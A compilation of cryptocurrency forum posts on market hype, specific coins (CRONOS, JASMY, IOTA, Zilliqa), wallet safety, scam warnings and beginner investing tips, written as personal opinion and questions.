Well, its finally here. With the recent all time high of ETH, people were excited for the new possibilities, but with the recent break out, its the bullish confirmation needed to show we are in alt-coin season. 

This past 2 years have been fun, and non traditional from a trading perspective. But the fact is alt coins are flying right now. Goldman Sachs estimated ETH at 8000 by the end of the year, and when ETH goes up, alt coins go up! This is the first year that coins no longer follow Bitcoin and they do what they want. Anyways, I hope yall are all making good money!

Side note: (because of things like the Squid games coin and Sheba, crypto is getting a bad reputation, lets show that time and dedication into coin research will show off in the end rather than either blind luck or scam) 

(Side side note: Most coins are extremely high in price right now, so whats your low cost coin that you are waiting for an ATH)

Hey everyone! Hope you all are enjoying watching your portfolios grow amidst the recent runs of most of the projects! 

As I was looking over my portfolio and watch list, I kind of came to a conclusion or rather had a thought I wanted to share. 

It seems that coins/tokens no matter how useful or useless, what the white-papers or developers seem to say, the market is driven by almost none other than hype. 

Now before I get attacked, Im not here to shill or bash ANY coins, just sharing a thought. Now in my opinion, it seems a novice could navigate this current market pretty well by simply following the hype and that would serve them well, whereas Ive taken time to do research into my projects and make my own investments only to watch a few of them takeoff and the others are at a standstill or loss despite their dev team, tech or progress along their roadmap. 

Ive been a little frustrated by this to be honest, and I dont feel like Im alone in that boat, but I very well could be. But the main point of this post was to share that idea, and I wanted to say that you guys shouldnt get down on yourselves about current runs or being able to have 16482% gains in a week. Some folks gets lucky catching those trains and some of us are lucky just to be a witness to the movement. 

Try not to beat yourselves up or fall into FOMO on projects and be disappointed. Simply take into account that research is VERY important but at the same time, use your brain to follow/track some of the market hype as well. The crypto game is highly reactive at this point and seemingly driven by emotion despite tech all around. 

I dont post much but I thought Id share these thoughts with you all. Mental health is important at a time like this and I simply want us all to be alright. Thanks folks!  May the gains be with you.

For me, I find this community has had a bit of an influence on my portfolio.  Although there are some posts that have no business being here, overall,  the wealth of knowledge some have is absolutely amazing, and I'd like to say thank you for the help from all of us.

Working together and communicating,  sharing stories and articles, opinions on which coins and tokens are good or bad, warnings of scams and scam coins have helped me out a great deal, and definitely most would agree it has helped them. 

I learned more about crypto, blockchains, defi, smart contracts, different platforms,  exchanges  etc from people explaining things in layman's terms, than watching videos on YouTube. These simple explanations allow most of us to feel more confident about making an investment.  In the end, our goal is to have more money than we invested,  whether it be $10 or $100,000. 
Once again thanks for the great posts.  Good luck to everyone with their investments in the future.  It can only go up from here.

CRONOS Mainnet - which is an EVM compatible smart contract chain by crypto.com with CRO as its native asset - will launch November 8. 

It is basically crypto.com's alternative to Binance BSC, and an attempt by them to copy the success Binance had with its chain. Basically, CRONOS is a copy of BSC, which is a copy of ethereum. 

There will be probably a lot of DEXs and other DAPPs hosted on top of CRONOS, as well as many shitcoins that will be created on the chain, like we have seen on BSC. In terms of decentralization, CRONOS wont be any better than BSC is.

The question now is, will CRO have a similar run like BNB had early this year? In my opinion, we do not need another centralized smart contract chain, that will be the home of thousands of shitcoins and scams. But crypto.com is very aggressively advertising their exchange, with a lot of partnerships, e.g. formular 1 or ufc, and i believe they will do anything to push their smart contract chain. Binance is lately having a lot of trouble, e.g. being banned in a few EU countries, and a lot of people are looking for alternatives. Crypto.com could use this and if they play their cards right, CRONOS could become a huge success. 

CRO is currently sitting on 5 Bn market cap, so there is room to grow. I personally do not own any CRO, but i could see it moving towards 50 cent in the coming weeks. What do you think?

Hi guys! 

Recently a new update has been made to the Ethereum network 'London Hard Fork'.

In this update, the EIP1559 was finally executed and it changed completely the economics of the ETH tokens.

I've made a video guide that explains exactly how, and how it will affect the ether price:

[https://www.youtube.com/watch?v=VVWxATYwGkM](https://www.youtube.com/watch?v=VVWxATYwGkM)

In the EIP1559 the developers created A transaction pricing mechanism that includes a fixed-per-block network fee that is always BURNED and dynamically expands/contracts block sizes to deal with transient congestion.

In the past - all the gas fees were earned by the Etheruem miners, and now there is a big portion of the eth fees that instead of being sent to the miners, is getting burned.

Once eth coins are burned, they are completely removed from the circulation supply and it creates more scarcity for ETH tokens.

This is a game-changer update and I think that it will empower the ETH token since it's the first time that ether will become a deflationary asset.

The more people are using Ethereum - more eth is getting burned - less eth in supply - eth price will go up. In this video we will talk about the Ethereum London Hard Fork, we will understand that is EIP1559, and will observe the website watch the burn that shows us exactly how much ether is being burned and minted every block.

I see a lot of posts discouraging taking profits and hodling till you are 60.

While I agree to hold some stakes in coins and projects for a long period of time, of which I would never fully cash out of anything I have invested in, do not be afraid to take your profits.

You invested your last 200 and its mooned to 2k? take 50% of it and use it to better your life, its all well and good looking at a screen and it showing you have 2k profit but if you never use it then what's the point? other than for a good old dick measuring contest?

Now I'm aware that some people live comfortably and risking 200 a month is no big deal, they don't need there gains and they can just watch it rise and good for you, well done to be where you are right now. However not everyone is that fortunate, if you need 1k from your profit for medical bills, or something that might improve your quality of life, take it!

As much as you will see older 40+ year old people wishing they'd bought in on bitcoin at 1k or wishing they'd got in on Microsoft when it was small, you also see many people wishing they'd took the profits when they had them that +2k you have today could be lower or even negative tomorrow who knows?

TLDR: don't let others dictate how you invest and how you enjoy your investments, live your own life and try to enjoy it, we are all buckled in for the ride together.

Hello,

I am a 21 year old female who wants to pursue a career in cryptocurrency/blockchain technology post-grad. I was hoping to get some advice. I have been investing in cryptos since 2017, but it was only until recently that I really considered pursuing cryptos as a career. I figured the first step was to educate myself more on everything crypto. In my free time I began listening to a bunch of podcasts, watching various Youtube videos, trying to learn trading patterns and trends, and began taking online coding courses. In this process, I found that while it is easy to find a plethora of online resources about crypto, most of them are about relevant crypto news and upcoming projects. I found that it is difficult to find information to educate myself on the technical side of cryptos so I can have a really firm foundation and understanding about what they are, how they work, and how they are going to affect the financial world. Basically, I want to educate myself enough so that I am a useful asset to hire in the future and have knowledge to offer future employers. I am in the process of applying for internships with crypto startups because I figured that would be a useful way to learn a lot. But, basically my questions are: 1) Where can I find the best educational information about cryptos? 2) Which programming languages would be the most useful for me to learn? (I learned SQL yesterday, but don't know what to learn next) and 3) What are the best ways to get involved and connected with other people in the crypto community? Thanks!

For years people have been harping about marketcaps and how the coin cant sell well because of the marketcap. Marketcap this and marketcap that, and now after all these years of the marketcap proclamations being pushed around, in the end it, means nothing. DOGE, SHIB, and the others showed that. So enough with the marketcap arguments.  In the end, people know [nothing]( https://c.tenor.com/bsEf3Q_nGpgAAAAC/schults-knows-nothing.gif), nada, zip, zero!  Now dont kill the messenger because of this post. I know some of you dont like TAs, charts, and others tools that other price predictors use constantly.   I just have a gripe about people always quoting "Look at the marketcap! You'll never make money!"  I never look at MC and it has served me well.

Am I correct in thinking Shiden Network (SDN) is about to really take off?

How is it that the trading volume is so high but the price action is still lagging?

Looking at: [https://coinmarketcap.com/currencies/shiden-network/](https://coinmarketcap.com/currencies/shiden-network/)

Any ideas about what is going on here, I was looking at coinbase and [crypto.com](https://crypto.com) as well and all of those sites are saying the trading volume is through the roof?

You get this picture about the trading volume:

Hello, new to the community and kinda new to crypto. I was sending some bitcoin from my coinbase to a hardware wallet (which I've used a few times before). I scanned the qr code on the wallet with my phone, and scanned the qr code on my phone with the wallet, and it sent. But then I received a text from coinbase saying, the BTC you just sent from your account is being delayed for security reasons. Check your email for details. I didn't receive an email about any problems with the transaction, I did receive an email from coinbase saying that I sent it. But the address I sent it to is different than the address shown beneath the qr code on my wallet. Did something happen and it was sent to the wrong address somehow? Or is that number shown under the qr code different than the wallet address for some reason? Any help on this would be appreciated, I just wanna know if this is normal or if something went wrong and I'm screwed.

Series of tweets from Former Goldman Sachs hedge fund manager Raoul Pal, 

&gt;Not on holiday yet so I'll allow myself one more thread... The markets are crazy! NFT are just jpegs! Dog coins! Cat coins! Tesla ! GameStop! Everyone is going to get burned! Don't they realize about discounted cash flows?!!! These people are ruining everything! Green energy?!


&gt;Crypto is a bubble! Tech is a bubble! VC is a bubble! Biotech is a bubble! Passive investing is a bubble! Web 3.0 is a bubble! Green energy is a bubble! The Metaverse is insanity! Cant they see??!! They are all wrong!

&gt;No. They are a new generation of investors. 86 million millennials got financialized in the US last year. They hit their prime investing ages of their 30's. They have debts, no savings, no hope from the grind. They are poor than any 30 year old in the last 70 years.


&gt;They were fucked.


&gt;Unlike their parents in their 30's, they didnt get gifted equities with a P/E of 7, bond yields at 13% or real estate at the lows versus income. They got the opposite. Their opportunity set was an expected negative future returns. They didn't want any part of our financial system

&gt;They had occupied Wall St and no one gave a shit. Now they don't give a shit about how you or I think you should invest or run markets. We let them down. Why the fuck should they care? They were sacrificed to the altar of debts, leverage and greed.

&gt;Millennials and Zoomers had nothing to lose. They had nothing. Then the pandemic hit and everything changed. We gave them free money and they collective said "fuck it" lets take risk because their stake was free.

&gt;If we were given a free stake at the casino, we would do the same. But they didnt buy our precious gold miners, or our discounted value businesses. Why? Because they don't care about 10% returns. The only way to level the playing field was to take MASSIVE risk.


&gt;Risk taking met Robin Hood options in 2020and magic happened... These younger investors changed the entire fucking game. They armed themselves will the skills of Reddit, Tok Tok and Instagram - communities, virality and memes and stuff that they were told was stupid, like Hertz

With the next moon distribution just around the corner, I'm wondering if there are any other Reddit-borne cryptocurrencies I can start to collect before they all become uber-mainstream.

So does anyone have any intel on whether or not other subreddits have implemented this sort of rewards system? Or are planning to?

I believe I heard some rumblings about something similar to Moons potentially coming to r/HipHopHeads but they all seem totally averse to this update taking place in their space, so who knows if it will actually stick.

I am sure some will not be pleased with what I am about to say so feel free to downvote me if you'd like to. We are witnessing history being made indeed and we are a big part of it and we should be so fucking happy about it! BUT.. 

Most of the people in here are being delusional! I know crypto has proven that impossible is possible but let's speak realistically. The times when you could do a 100x is over. In order to do that now you must be extremely lucky and not only finding that coin but knowing when to pull out because it will probably be a shitcoin. The easiest example is this. Imagine there are people who actually buy Shiba at these levels thinking it will reach 1$, meaning it will reach $5,000,000,000,000 market cap. Yes you read that correct. Meanwhile, the whole crypto market is $2,5 trillion.

But let's not focus only on meme coins since it's only a trend hopefully. Remember during the previous bull cycle some coins that where supposed to be top 10 with great fundamentals and potential to dethrone even the king? Yeah, guess where they are right now. Most of the coins being in the top 50 now will probably be replaced by new ones sharing the same hype. Your altcoin gem will likely not give you a 100x, not even a 10x. 

It's not the beginning. The beginning was several years ago and you missed it. I missed it. The adoption is huge and crypto will stay for a long long time but remember, BTC is the king and it will likely remain. Don't depend all your savings on alts hoping to become rich. Only a very few will manage such a thing and they are the only ones you will hear about. You will not hear about the ones that lost everything. 

Realism can sometimes be confused with pessimism. Thank you for your time.

Hey guys. I bought in into the Squid Game scam. Don't be like me. 

I heard about this token a week ago and I went to do research. What I found? 1000x evidence that this was a scam, but I was intrigued.

I thought, let me put 10$ in this just for funnies. I got around 661 SQUID.

As the days went by, I started seeing it climb, 1$, 2$, 5$, 10$, 30$, and I was thinking... Imagine if I can take this money out. Of course I knew that I wouldn't ever take the money out, I was fully convinced of that, but it was fun to see it happen.

Couple of days later, I go to check the SQUID price and it's at 2000$. I was like wtf? 2000$ times 661 SQUID is 1.3 million dollars.
I was a crypto millionaire.

5 minutes later it crashed down to nothing, but the 10$ wasn't for nothing.

I'm now able to say I was a crypto millionaire at some point of my life.

Adviser: Don't ever put money on scam coins, always do your research and be careful on what you invest. I was fully aware of this scam.

Hi there! This is not really a "new crypto" but it's almost unknown to many, so i thought it would be nice to spread the word about it.
Jasmy is the very first legit Japanese crypto, some good guys are working on it (Sony ex CEO for exemple) and this week it made us (r/JasmyToken) gain a lot!
It has the most gains today on Coinbase, i don't know if it's available in other exchanges btw.
I suggest you to read something about it, even if most of what's written online is in japanese lol
Hope to see many of you in our subr community, see you soon!


Spoiler: Yes, i own some JASMY, but i'm doing crypto just for fun so don't think i'm suggesting you this to make a tons of $!
Just wanted to share an interesting crypto with you all :)

When using the coinbase wallet app, if you have a coinbase account linked, there is a suggested address to send funds to. The app itself supports polygon, arbitrum etc with a simple change of network in settings.
 
Now, if you are using these networks due to insanely high gas fees then coinbase gives you an option under send' to send to your coinbase email address (all pre
filled). They have included this while on any network so transfer funds across to the marketplace.
 
NEVER DO THIS. This address is not linked to your coinbase account, it does not credit 1:1 with layer 2 ETH nor is it even the same address. I cannot find this
anywhere online and you can lose serious funds doing this. Coinbase have not responded to my concerns around this and due to rising gas prices many more people will lose funds using coinbase wallet.
 
I cannot believe this has even gone into production as the pre filled coinbase account section is so easy to press, this will likely be removed in a future update but who knows how many people will be fooled before then.

STAY AWAY FROM COINBASE WALLET!

I've been holding Eth was a while now , it keeps going up breaking new all time highs but it is rarely mentioned anymore. A few months back ETH was basically all we talked about, but now that it is at its all time high with no signs of stopping , no one even mentions it.

We are all focused on finding the next shitcoin to 10x that we completely forgot about Ethereum .

Thanks to this sub Eth is major of my holdings, was kind of disappointed not to see this sub flooded with Eth posts.

Ethereum now has a market cap of $525 billion . Last year this day , the price of eth was $396 . Eth has come a long way since then. Its great to see a crypto with value go up . Projects like Eth is what makes the crypto space valuable .

A well deserved pump for Eth .

Congratulations Eth holders !

I see these terms used interchangeably all the time and it drives me crazy. They're not exactly the same thing. A cold wallet is simply a wallet that's never connected to the internet. It can be a hardware wallet or a software wallet. Electrum can easily be used as a cold wallet either a live environment like tails or via a PC that's never connected to the internet. If you wanted to get technical, a paper wallet (although not recommended for use much these days) could be a cold wallet. 

A hardware wallet is something like a Trezor or a ledger. It's simply a cold wallet that lives on a dedicated hardware device. 

So a hardware wallet is a cold wallet, but a cold wallet is not always a hardware wallet.

JASMY is an interesting new IoT based project in Japan, and it was listed on coinbase about a month ago. 

Since than the price has gone up 1300% and yesterday alone it went up 100%. It has a relatively smaller market cap (1.3 billion) and yet there is nothing about it talked about on here. 

Also, coinbase hasn't even been listing it under "top gainers" even though it is up 100% in the past day.

Mostly what I am asking is: why would this project have slipped through both coinbase top gainers section and this sub? Is there something wrong with the project? I am concerned that only 10% of the total supply is in circulation, and I haven't found how they plan to bring the other 90% into liquidity, but other than that, why is it silent?

 **Hi all,** I have a question about my crypto-investment strategy, for you experts: 

**2 years ago I invested 200.000 USD in crypto, and Ive been perfectly using always the following strategy:**  

1- **I choose the crypto-projects** I believe has more common sense for the future (based on the papers I found online and the criteria of a non-expert.) 

2- Therefore, **I invested 200.000k USD** (like this 50k in ethereum, 50k in cardano, 50k in Algo and something like 6 months ago I did 50k in Polkadot.) 

3- **Every time I see one of my cryptos reach more than15% of gain, I sell 15%** immediately and I take it to my personal project (a foundation to help special kids) and my personal safes. **Therefore, the crypto accounts are always around 50k USD each.** 

Even though, from my point of view, the strategy has demonstrated to be SUPER SUCCESSFUL, some friends of mine told me I am stupid. Thence,  I need advises for my next steps. 

**a. What do you think about my strategy?** I am losing something? ( how to calculate the compound interest "damage" I've done?, is it too big? Is there something else I am losing here?) 

b. Now, that the initial investment is more than recovered (break even), **Should I keep the same strategy?** Is it a stupid strategy like my friends tell me? 

Note: Mybe is important to underline that I have my own company and I have no time to follow crypto on daily bases. 

Thanks a lot for your support ! 

YESSIC !!!

Hey guys,

Maybe this is a stupid question, but I still didn't quite get the gist around the several [crypto.com](https://crypto.com) apps yet. I have several wallets (Coinbase, MetaMask) for which I noted the seed phrases to paper instantly. However, I happen do wonder what about the [crypto.com](https://crypto.com) seed phrase. Currently I am only using the general [crypto.com](https://crypto.com) app. But it is my understanding that this basically acts as a wallet as well?

So is there a seed phrase or is it just like a good ol' "forogt password" to recover the account if I lost my phone?

Thanks so much in advance! :)

At the end of November it will be known whether IOTA has passed to Phase 2A of EBSI (European Blockchain Services Infrastructure)

The European Commission is looking for novel blockchain solutions for the European Blockchain Services Infrastructure. The procurement contracts have been awarded to 7 contractors and the first phase of solution design is ongoing.

&amp;#x200B;

**The call for tenders**

The contract notice for the EU blockchain PCP was published on 25 November 2020 on TED and the deadline for submission of offers was 28 January 2021. The package of all the tender documents and Q&amp;A are still available online in eTendering.

The contract award notice was published on 27 July 2021 on TED.

7 contractors (including consortia) were selected for the first phase of the PCP (phase 1).

Depending on the quality / price of the offers that will be received for phase 2 of the PCP, it is envisaged that, out of the 7 phase 1 contractors, around 4 contractors  will continue to the second phase (phase 2A) and around 3 contractors  to the last phase (phase 2B).

&amp;#x200B;

**Indicative timeline for the PCP :**

Phase 1 (solution design): Launched on 19 July 2021 for a duration of 3 months

Phase 2A (prototype development and lab testing): Will start 1 to 2 months after phase 1 for a duration of 6 months

Phase 2B (further solution development / finalization and field testing): Will start in continuity of the phase 2A for a duration of 12 months

The first phase of solution design is currently ongoing with the following 7 contractors:

* IOTA Stiftung
* IOV42 IP Ltd
* Stichting [Dyne.org](https://Dyne.org), Infocert Spa, RIDDLE &amp; CODE Gmbh
* Orange Business Belgium SA
* Chromaway AB
* Billon Sp. Z O. O.
* Westpole Belgium, Net Service Spa, Flosslab s.r.l

Let me remind you that in the first round, IOTA received the largest number of votes. This gives a 95% chance that IOTA will be among the 4 out of 7 companies that make it into Phase 2.

This could dramatically increase the price of IOTA in November.

If IOTA enters Phase 2 it gives it a 75% chance of being among the 3 companies that passed Phase 2B.

After weeks of consolidation in 60k region we've clear signs of bulls taking over and meme coins losing influence in the market.

I'm always gonna stick to coins that hold utility no matter how much other coins gain, it's not like a competition, it's just I feel more safer with my investment. 

I would also like to thank a post in this community for talking about LRC, I managed to get in early and made 100% gains, DOT also looks to be doing very well and I'm glad investors are chosing Utility again.

Excited to see what this month has in store for us, and hope we can reach new ATH for alt coins. Heck maybe even the  the sub will be back to what it used to be.

Hello friends, 

As the title says, which of these two is the most succesful for you and why?

I am looking to establish a good strategy for myself in order to be profitable on long and short term. Something in between those two. 

I was thinking about having 50% of my portofolio long term Dollar cost averaging on the blue chips of crypto, every month with personal fiat and profit from other smaller cap coins. 

40% of portofolio for day trading purposes.. alt coins with smaller caps etc. 

10% meme coins "just in case". 

I was recently trying different scenarios mostly trading with all the money and was relatively succesful until greed got into me and jumed into SLP a few days ago with 50% of my portofolio money thinking it would follow MANA SAND and ENJ bull run. I took a big hit and lost all profit i made prior days...


What do you think? Time in the market, Timing the market or both?

Is my purposed scenario good?

Hey, I wanted to get into staking because a bunch of people are talking about how its a great way to earn passive income. I wanted to start off with a small amount on a stable coin so theres not a big risk on it. It seems like if I where to put 500 into a stable coin it wouldnt really give me much of a passive income at the APY they are giving. I wanted to see if there are better options that are not very risk. I really just want to use my cash thats just sitting around waiting to be used. I might as well put it to use. Any suggestions would be great.

Hello everyone, I probably have a stupid question but this one has been bothering me for a while. I'm sure you know the "cycles" they talk about 3 years bear market, 1 year bull market.
What do you think with increasing entry of international investors will there be such a drastic cycle? My question is specifically for Bitcoin and Ethereum. Bitcoin will probably no longer be so volatile due to the marketcap? ETH in particular is impossible for me to estimate.. Please let me have your thoughts on this.

Thank you very much in advance.

I am the author of the post ''Crypto 101 - the Do's and Dont'ts of Crypto investing.'' that was trending 4 days ago. -[https://np.reddit.com/r/CryptoCurrency/comments/qi8azn/crypto\_101\_the\_dos\_and\_donts\_of\_crypto\_investing/](https://www.reddit.com/r/CryptoCurrency/comments/qi8azn/crypto_101_the_dos_and_donts_of_crypto_investing/)

For the new comers - I suggest giving it a read, it has valuable information which would prevent you doing the rookie mistakes I've done in the past.

This is part 2, consisting of the top comments on the first post. I gathered and listed everything that is advice-worthy in my opinion. The source here is you, the redditors.

\-**Don't listen to advice on the internet**  
Top comment. Although a meme in this case it does have some truth in it. Nobody on the internet has his heart on you and nobody cares if you win or lose. Odds are, strangers want you to lose to make them feel better on either their losses or to boost their ego on their profits.   
Take everything you read on the internet with a grain of salt.

\-**Always buy high, sell low**  
This one is also a used as a meme, but if you flip it around is actually a valuable piece of advice. In order to profit, you are supposed to buy something at a low price and sell it at a higher price. In crypto reality though, I would paraphrase to ''buy when it's red, sell when it's green, don't chase pumps and if your coin is dumping - wait it out, don't sell it at a loss. It's time will come'' This considering you are investing in a serious project, ofc.

**- Do not dump more money into the crypto coin after it pumps in hopes of getting more gains.**This one might come out as a bit controversial, but it's mostly a situational thing, learned through blood. The long story short here is this. If a coin has already pumped, the chances of it pumping again are slimmer than it having a correction back down. Investing more in an already pumped coin has a higher risk, lower reward ratio. Avoid it. Unless ofc. news suggest otherwise.

**- It's safer to keep your coins on an exchange, rather than a cold wallet.**This is one I don't really agree on, but many people do, so I will explain a bit more and let you decide for yourself.   
In the past crypto exchanges used to be hacked all the time, people got robbed out of their coins constantly. Now, established exchanges don't get hacked, or rarely and safety is much better.   
However, cold wallet being the safest option in general does have it's drawbacks. If you lose your seed phrase - your coins are lost. Turns out many people manage to lose theirs.   
Some redditor pointed out that living with roommates makes hiding your phrase a whole lot harder than having 2FA on your phone to your exchange. And, if you manage to lose all your access to the exchange, they can retrieve it through KYC.   
I agree, for some people it might be safer to keep their coins on an exchange.   
Please just use the top 3 exchanges in that case.

**- Don't buy the popular sentiment. Look at the fear and greed charts.**  
This is probably a big one. Learn how to read popular indicators and base your actions on them. People around you can be very misleading in their sentiment, either overbullish or overbearish.   
It's very easy to fall into the trap of following someone who seems to have a bit more knowledge of crypto than you. Don't.   
Learn yourself.

\-**Don't send any coins to anybody to "confirm your address". Nobody will amplify your coins, it's a scam.**  
These are some of the most popular scam tactics. Scammers will always promise some big reward, but you have to be the one taking the first step in transactions for some tiny amount of money in order to receive the big money. Do you remember the popular Nigerian prince email scam years ago? Basically the same thing.   
Don't send anyone money, nobody in this world will spend even a minute of his own time to help you win big.

**- Do your own research and form your own opinion.**  
This one seems pretty obvious, but I will add to that. Choose your sources of information wisely. Take everything with a grain of salt, compare points of view and than form your own opinion. We all know about the recent Squid scam. Many people fell into it because of BBC posting an article.   
Yes, that BBC.   
Some months ago popular news websites announced that Wallmart will accept Litecoin, than some other websites published that aswell. Turned out to be fake news, but many people lost a lot of money because they trusted unreliable sources.

\-**Don't forget about the IRS because I guarantee you that the IRS won't forget about you.**  
Taxes. Remember that you have to pay taxes on everything you make. Try to look at this as a good thing.   
You want an ambulance when your beloved one is sick? That comes from taxes.   
You want a firetruck when you have your house catches fire? That comes from taxes.   
You want to be able to count on the police doing their job? Taxes.   
Clean roads, streets, parks - all that comes from taxes. It's a comfort we all take for granted. Don't be like this, in order for a society to work - pay taxes.

**- Have an exit plan for each coin and write it down. Don't allow greed to control you not making profit.**  
Really, write down a plan and follow it.   
Nobody knows when the bull market will end, but we all know it will end at some point and all coins have 80-95% correction, basically wiping out all your profits and putting you in the bloody red. It's easy to fall victim of your own greed when things go parabolic, but remember, that's how people lose their money overnight.   
Follow your plan.

**- Only invest what you can stand to lose.**  
At this point this one sounds more like a cliche to the OGs here, but you would be surprised how many of the new retail money flowing into the market when the FOMO hits comes from loans, mortgages and basically money people cannot afford to lose without messing up their lives. Don't do it. Better have a smaller profit from your own money than lose your home/car/lifesavings.

I doubt I am going to make a part 3 of this.  
I hope this makes your learning experience not-so-rough, because some of these have been written with tears. :)

Facebook is now meta and it will be pushing it's way into the VR metaverse space. It is an upcoming competitor straight and simple to metaverse coins. 

Giving it your usage metrics and eyeballs on their ads only empowers it to take a big old dump on your metaverse project. It has more money than most countries, the odds are already in it's favour so do a small part and delete.

Just look at this cringe, 
https://streamable.com/j61m74

Even if you aren't putting money into metaverse coins it's still a good idea to get out of the Facebook ecosystem as much as possible.

I can't be the only one that thinks these play to earn games are all underdeveloped and lack earning potential as a player due to so many features of these games being promised for a future date. I get that Facebook announcing the new brand Meta and how they see their future has cause a lot of speculation about the future of the gaming space and the potential of play to earn games in the Metaverse but these games aren't there yet and neither is the space for them to thrive. The gaming space is a highly competitive space where games become obsolete with advancement in technology. 
I just believe that these game tokens are being overbought and overvalued already. Yes I have tried a bunch of them, after getting Alice and TKO from Binance and started trying a bunch of them out and I find the same problems with all of them. 
Anyone else try some of these games out and feel the same way?

Being alive is sometimes very difficult, because there is something you can't see. 

You can't see it because you are not thinking in the right terms.

As an example, almost every politician in history looked at statistics. He is not looking at you, he looks at a statistic and if this statistic in your state or country tells about narrow minded Christian/Muslim w/e hard liners he will evaluate this, act and say things accordingly to the preposition. If the narrative shifts, he will shift his facts slowly, to not loose the hardliners, but surely.

If this is something new to you and you did not think about it hard and clear, this will frighten you or you will dismiss it.

The truth is, most people don't think about reality as it is, they think about their individual reality and this individual reality doesn't mirror the true reality. The true reality, a huge planet an ever-expanding universe were so many things go on that describe reality, is almost impossible to get the full picture of.

What political players take for their advantage is money and statistics. Statistics tell you everything about every state, every country, every city, every suburban small fracture and then these statistics put you as an individual in a broad place.

When you think as an individual, try to abandon the main principle of this narrow thought process.  You.

If you do not think broad space, you don't think at all.

And if the politician does not think about reality this way or takes these principles into consideration  do you really want her or him to govern you?

You're a subject for others, who think broad space.

Try not to be anyone because you will fail at everything.

Try to be someone and succeed at something.

Many people don't know this but a lot of Crypto rug pulls get their images of the development team (who don't exist) directly from AI! 

How you ask? Well there is this website [https://thispersondoesnotexist.com/](https://thispersondoesnotexist.com/) that does exactly that. 

Simply refresh the page and you are shown a person that has \*\*never existed.\*\* you can keep refreshing until your fingers are aching.

This has several advantages to using a real person to act as part of the project. The first thing is the the real person, cannot find about the Rug and their associated name and report it. The second advantage is that the same image cannot be found on reverse image searches nor LinkedIn nor anywhere else. That is because 99% of the time, the AI image is a one of one.  

This is the extent that thieves have gone to scam money. This is why we STRESS that DYOR must be completed. If at any stage things don't make sense or seem strange, exit immediately. There are also up and coming Crypto audit firms that are trying to tackle this.

So Im one of the many fortunate/Unfortunate people that are holding the dog killer coin in coinbase wallet  ( A company that has nothing to do with Coinbase by the way) fortunate because of course the coin is growing but unfortunate because I cant do anything with it. Coin base pro has no buy or sell or deposit or withdraw keys in my application . I live in Louisiana so I cannot use binance to get the coins out, I tried all night to get verified by Kraken but unfortunately my screen goes white on desktop and iPhone . However, I did actually get to have a text conversation about it with an actual human being which was nice. Coinbasesupport is a joke. I got in on Mana The other day and was up $300 on regular Coinbase but when I went to cash out I was rejected until I lost $100. I figured out that I can actually move my coins into eToro ... but cant touch them for seven days so getting in on the kraken action is not going to happen for me today. When I opened regular Coinbase today and looked up the coin and there was actually an ad letting me know that I can buy it on Coinbase wallet. And the finger to you as well cionbase ... sorry about the rant its been a long night. Anyone has any advice Im all ears. Best of luck to those that can actually trade coins today.

Friend texted me, "dude i have an advice for you that could get us rich", I'm like what?, I was waiting for something dumb already and then he goes, we should put some money in SHIB and wait for it to reach 1$   

Here comes the hard part, i do some math and tell him that if that happened SHIB marketcap would be 4 hundred times more than that of BTC and it would have more money than the whole market put together, then he's like "But at least 0.1$ easily", I repeat that's also not possible, then he gets mad and tell me that I don't know shit because he heard it from some IG influencer, and he was pretty sure of it...  

TLDR: Don't try to explain marketcap to people :(

_"Today is Day 3 of me doing full-time in cryptocurrency as a reddit publisher. Hope I can get support from the community. 5 months 3 days of reserve left for my family and I"_

_"Full Disclosure, I only have 0.03% of Zilliqa in my portfolio."_

# What or Who is Zilliqa?

Zilliqa was founded in June 2017 by two scholars from the National University of Singapore, Amrit Kumar and Xinshu Don. The mainnet of the network became active in January 2019. In 2017, the project performed an Initial Coin Offering (ICO) for the ZIL coin, raising over $22 million in ETH.

Zilliqa is backed by the founding Zilliqa Research company as well as ZILHive, a growth initiative company.

Zilliqa is a piece of software that intends to incentivize a global, distributed network of computers to run a blockchain platform with the goal of increasing user scalability through sharding. As such, Zilliza is one of several competing blockchains trying to build an ecosystem of decentralized applications (dapps) and cryptocurrencies, such as Ethereum, Tron, and EOS.

To distinguish itself from competitors, Zilliqa employs a sharding mechanism that divides its infrastructure into numerous interconnected blockchains in order to enable more transactions. Zilliqa also introduced Scilla, a native programming language that focuses on security and allows developers to create and deploy customisable dapps that mimic real-world applications.

To enable all of these characteristics, the network's native cryptocurrency, ZIL, is utilized to execute programs, send transactions, and encourage network actors.

# How does it work?

The Zilliqa ICO attempts to overcome the scalability issue by sharding. Sharding is the process of separating the Zilliqa network into groups of nodes known as shards. Each shard consists of 600 nodes. Shards function similarly to mini-blockchain networks.

Shards handle transactions independently of one another rather than as a group. This enables a far greater number of transactions to be processed. It also means that as the network increases, transactions will be processed more quickly. The greater the number of shards, the greater the number of transactions that can be processed. In October 2017, Zilliqa processed 1,218 Tx/s on its private testnet using three shards (about 1,800 nodes). The Zilliqa testnet processed 2,488 Tx/s using 3,600 nodes or 6 shards. Transaction speeds on Zilliqa's public testnet are marginally slower. Testnet v1.0 contains 961 nodes with a transaction time of slightly more than 100 Tx/s. Nonetheless, this is more than five times faster than Bitcoin!

# Sharding issues

The fundamental issue with sharding is that when a blockchain is divided into groups of nodes, the information stored on it is likewise divided. Keep in mind that each Bitcoin node includes the entire blockchain. This means they don't require any further information to complete transactions.

Shard nodes only contain a subset of the blockchains. This implies they must communicate with other nodes in order to obtain all of the information they require. On a network of thousands of computers, this can quickly get very complicated!

# How can Zilliqa be used in real world scenario?

The crypto world has been waiting since the Zilliqa ICO to see if the Zilliqa network can deliver the services it is promised. But who will benefit the most from Zilliqa? Zilliqa is a public blockchain, which means that anyone can use it. However, the platform will mostly appeal to customers looking to create high-volume smart contracts and dApps.

There is a market gap for a platform that can enable smart contracts and dApps that require high transaction speeds to function properly. When the Zilliqa main net is operational, it may house a huge social media dApp similar to Facebook or Twitter. It can also help with advertising campaigns and payment processing services. The platform has enormous potential, as demonstrated by the Zilliqa ICO. Transaction speed testing have piqued the interest of the development community and piqued the interest of many more people. When it launches, the Zilliqa blockchain could be incredibly active!

# How secure is Zilliqa?

When compared to networks that use centralized data storage, such as Google or Visa, blockchains are extremely secure. A blockchain is made up of thousands of interconnected networks. To hack a blockchain, you must have control over more than 50% of its nodes.

Zilliqa includes two distinguishing security features:

1.  The initial layer of Zilliqa's hybrid consensus mechanism (HCM) confirms the identities of nodes. This prevents Sybil attacks from occurring.
    
2.  Scilla: Scilla is Zilliqa's coding language. Scilla only permits developers to write software that is safe to operate on the Zilliqa network. Users can rely on the smart contracts created with it.
    

